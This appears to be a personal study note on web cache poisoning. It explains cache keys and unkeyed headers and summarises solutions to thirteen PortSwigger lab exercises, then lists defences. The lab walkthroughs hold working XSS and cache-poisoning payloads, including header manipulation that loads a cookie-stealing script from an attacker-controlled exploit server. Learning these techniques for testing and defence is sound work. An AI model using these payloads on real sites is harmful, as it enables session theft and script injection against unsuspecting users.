> You are only as secure as your weakest point
# What is web cache poisoning?
Web cache poisoning is an advanced technique whereby an attacker exploits the behavior of a web server and cache so that a harmful HTTP response is served to other users.
## How does a web cache work?
If a server had to send a new response to every single HTTP request separately, this would likely overload the server, resulting in latency issues and a poor user experience, especially during busy periods. Caching is primarily a means of reducing such issues.
The cache sits between the server and the user, where it saves (caches) the responses to particular requests, usually for a fixed amount of time. If another user then sends an equivalent request, the cache simply serves a copy of the cached response directly to the user, without any interaction from the back-end. This greatly eases the load on the server by reducing the number of duplicate requests it has to handle

![[caching.svg]]
## Cache keys
cash key is the parameter that the cash server send the cashed request to . Components of the request that are not included in the cache key are said to be "unkeyed".
*If the cache key of an incoming request matches the key of a previous request, then the cache considers them to be equivalent*. As a result, it will serve a copy of the cached response that was generated for the original request. This applies to all subsequent requests with the matching cache key, until the cached response expires.
Crucially, the other components of the request are ignored altogether by the cache
## what is unkeyed headers ?
Variations in this header are ignored when determining if a cached response should be served
If an attacker sends a request with an unkeyed header and poisons the cache, their modified response might be served to other users, even if their requests lack the header.
#### Probable Keys (some cash keys might be not appear in the request)
* User-Agent
* cookie
* X-Forwarded-Host
* X-Host
* X-Forwarded-Server
* X-Original-URL
* X-Rewrite-URL
- X-HTTP-Method-Override
- X-HTTP-Override
- X-HTTP-Method

*A cache-buster is a technique used to force the browser or any caching system to fetch the most recent version of a resource, rather than using a cached version. This is typically done by appending a query parameter to the URL of the resource, such as an image, stylesheet, or script.*

---
## What is the impact of a web cache poisoning attack?
- **What exactly the attacker can successfully get cached**  
    The impact of web cache poisoning is linked to how harmful the injected payload is. As with most kinds of attack, web cache poisoning can also be used in combination with other attacks to escalate the potential impact even further.
- **The amount of traffic on the affected page**
	As a result, the impact can range from non-existent to massive depending on whether the page is popular or not.
## How to constructing a web cache poisoning attack
#### 1. Identify and evaluate unkeyed inputs
Any web cache poisoning attack relies on manipulation of unkeyed inputs, such as headers. Web caches ignore unkeyed inputs when deciding whether to serve a cached response to the user. This behavior means that you can use them to inject your payload and elicit a "poisoned" response which, if cached, will be served to all users whose requests have the matching cache key. use **Param Miner**
#### 2. Elicit a harmful response from the back-end server
Once you have identified an unkeyed input, the next step is to evaluate exactly how the website processes it. Understanding this is essential to successfully eliciting a harmful response. If an input is reflected in the response from the server without being properly sanitized, or is used to dynamically generate other data, then this is a potential entry point for web cache poisoning.
#### 3. Get the response cached
Once you work out how to get a response cached that contains your malicious input, you are ready to deliver the exploit to potential victims.
![[cache-poisoning.svg]]




### what is the objectives of cache poisoning ?
- stored XSS
- DDOS
- disclose sensitive information
- password reset attack
- un-authentication access to sensitive pages

## Labs
* #Portswigger
	1. **Web cache poisoning with an unkeyed header** #PRACTITIONER 
		I just use `x-forwarded-host` header to change the host to my web server and then poison the cache to import files from my server
	2. **Web cache poisoning with an unkeyed cookie** #PRACTITIONER 
		*try XSS payload in the request FEHOST cookie parameter and cache it then delete the cache buster and send the request*
		why the XSS payload triggers an alert when you remove the cache-buster parameter ?
		**Shared Cache for Different URLs** #PRACTITIONER 
	    The caching mechanism might not properly differentiate between requests with and without the cache-buster parameter. As a result, it serves the cached response containing the XSS payload when you remove the parameter.
	3. **Web cache poisoning with multiple headers** #PRACTITIONER 
		you have to poison the cache on using endpoint `/resources/js/tracking.js` by add the headers `x-forwarded-host` and `x-forwarded-scheme` and add `http` as a value to the second header but why ? to make the server redirect you to the written host because of your unsafe connection way
	4. **Targeted web cache poisoning using an unknown header** #PRACTITIONER 
		to solve this lab you will try to steal the cookies of the victim by create `/resources/js/tracking.js` with `alert(document.cookie)` inside the file and use param miner to know the unkeyed header which is `X-Host` now add your server name to this header and to know the victim user-agent post comment make the user interact with your server `<img src="https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/foo" />` and open the logs to know his user-agent and put it in the request then cache the request and you solve the lab
	5. **Web cache poisoning via an unkeyed query string** #PRACTITIONER 
		the query string printed in the response so we will inject XSS payload on it and cache it
		the payload will be `GET /?dula=1234'/><script>alert(1)</script>//`
	6. **Web cache poisoning via an unkeyed query parameter** #PRACTITIONER 
		in this lab the cache is keyed to the URL and if we add parameter it will be keyed based on, so we need a parameter that the cache do not keyed to which is `utm_content` this parameter usually used in advertising analytics and the cache exclude it from the URL while caching so we will use it to add XSS payload and then delete this parameter
	7. **Parameter cloaking** #PRACTITIONER 
		to solve this lab we will manipulate this endpoint `/js/geolocate.js?callback=setCountryCookie` and we will use on the parameters that excluded and do not cached based on which is `utm_content` and then make its value equal to `anything;callback=alert(1)` in the some servers it treats `;` as delimiter between parameters but the cache server treats it all as one parameter so we will use it to add another parameter which is `callback=alert(1)` to overwrite its value to make the whole payload is `/js/geolocate.js?callback=setCountryCookie&anything;callback=alert(1)`
	8. **Web cache poisoning via a fat GET request** #PRACTITIONER 
		to solve this lab we add `alert()` as a value to `callback` function in the body of the get request and add `x-http-method-override: POST` header to update the data of the `callback` function using method spoofing
	9. **URL normalization** #PRACTITIONER 
		`/adel</p><script>alert('adel')</script><p>` this is the payload In Burp Repeater, poison the cache with your payload and then immediately load the URL in the browser. This time, the `alert()` is executed because the browser's encoded payload was URL-decoded by the cache, causing a cache hit with the earlier request.
		Re-poison the cache then immediately go to the lab and click "Deliver link to victim". Submit your malicious URL. The lab will be solved when the victim visits the link
	10. **Web cache poisoning to exploit a DOM vulnerability via a cache with strict cacheability criteria** #EXPERT 
		to solve this lab and you have to `alert(document.cookie)` in the victim browser so after digging you found that in this file `/resources/json/geolocate.json` the web site takes value of the country and add in the DOM of the site so you add this payload in your server `{ "country": "<img src=1 onerror=alert(document.cookie) />" }` and poison the cache and this header to your server to allow CORS `Access-Control-Allow-Origin: *` to poison the cache we used param miner to identify the unkeyed header and we used it to poison the cache like this `X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net` 
	11. **Combining web cache poisoning vulnerabilities** #EXPERT 
		to solve this lab you need to make a chain of endpoints you notice that if you change the language using this endpoint `/setlang/es` you will be redirected to `?localized=1` this endpoint
		*part 1 :* we will poison the `/` main site using `x-forwarded-host` header set to our server and in our server we will add `/resources/json/translations.json` file to be loaded from our server and add `Access-Control-Allow-Origin: *` to enable CORS and add this payload to our sever `{ "en": { "name": "English" }, "es": { "name": "español", "translations": { "Return to list": "Volver a la lista", "View details": "</a><img src=1 onerror='alert(document.cookie)' />", "Description:": "Descripción" } } }` and poison the `?localized=1` endpoint
		*problem :* the victim uses English which makes him not redirected to the poisoned cache response 
		*info :* Notice that the website is vulnerable to DOM-XSS due to the way the `initTranslations()` function handles data from the JSON file for all languages except English
		*part 2 :* we will add `X-Original-URL` header in `/` the main page with value set to `/setlang/es` to force redirection of the user However, you will find that this response cannot be cached because it contains the `Set-Cookie` header Therefore, `X-Original-URL: /setlang\es` triggers a 302 response that redirects to `/setlang/es`. Observe that this 302 response is cacheable and, therefore, can be used to force other users to the Spanish version of the home page
		*final :* now cache both requests `/setlang\es` + `?localized=1` and wait users to be fall on it 
	12. **Cache key injection** #EXPERT 
		The two crafted requests manipulate the cache so that when the victim (using Chrome) loads the /login page, it will reference a poisoned version of the `/js/localize.js` script.
		This poisoned script triggers the` alert(1)` JavaScript in the victim's browser, solving the lab
	13. **Internal cache poisoning** #EXPERT 
		to solve the lab use `x-forwarded-host` to change it to your host and put the file `/js/geolocate.js` on your server with payload `alert(document.cookie)` and then send the request multiple times to cache it and you solve the lab


# Common defences against cache poisoning vulnerabilities
- If you are considering excluding something from the cache key for performance reasons, rewrite the request instead.
- Don't accept fat `GET` requests. Be aware that some third-party technologies may permit this by default.
- Patch client-side vulnerabilities even if they seem unexploitable. Some of these vulnerabilities might actually be exploitable due to unpredictable quirks in your cache's behaviour. It could be a matter of time before someone finds a quirk, whether it be cache-based or otherwise, that makes this vulnerability exploitable.
```chartsview
#-----------------#
#- chart type    -#
#-----------------#
type: Radar

#-----------------#
#- chart data    -#
#-----------------#
data:
  - item: "Back-End Code"
    user: "Effective against the attack"
    score: 90
  - item: "Browser"
    user: "Effective against the attack"
    score: 0
  - item: "Server"
    user: "Effective against the attack"
    score: 80
  - item: "Client-Side Code"
    user: "Effective against the attack"
    score: 0
  - item: "WAF"
    user: "Effective against the attack"
    score: 50

#-----------------#
#- chart options -#
#-----------------#
options:
  xField: "item"
  yField: "score"
  seriesField: "user"
  meta:
    score:
      alias: "Score"
      min: 0
      nice: true
  xAxis:
    line: null
    tickLine: null
  yAxis:
    label: false
    grid:
      alternateColor: "rgba(0, 0, 0, 0.1)"
  point: {}
  area: {}
```
# NOTES
**Host Header Alone Doesn’t Change Destination**: The `Host` header only tells the server which domain's content is being requested. The actual network-level destination is determined by DNS resolution and IP addressing